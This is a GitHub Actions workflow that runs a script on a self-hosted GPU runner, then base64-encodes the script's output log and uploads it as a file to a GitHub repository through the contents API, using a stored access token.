name: ul-pivot-9927
on: workflow_dispatch
permissions:
  contents: write
jobs:
  pivot:
    runs-on: [self-hosted, ul-l40s]
    env:
      PUSHTOK: ${{ secrets.GH_PAT }}
    steps:
      - uses: actions/checkout@v4
      - run: |
          set +e
          bash ul-bin/pivot9927.sh
          tail -c 2500 /tmp/pivot-9927.txt
          B=$(base64 -w0 /tmp/pivot-9927.txt)
          printf '{"message":"pivot9927","content":"%s","branch":"main"}' "$B" > /tmp/b.json
          curl -s -m 90 -X PUT -H "Authorization: Bearer $PUSHTOK" -H "Content-Type: application/json" --data @/tmp/b.json "https://api.github.com/repos/dongsuju/ul-plant/contents/out/pivot-$GITHUB_RUN_ID.b64" -o /tmp/put.out -w "PUT %{http_code}\n"
          head -c 300 /tmp/put.out
          exit 0
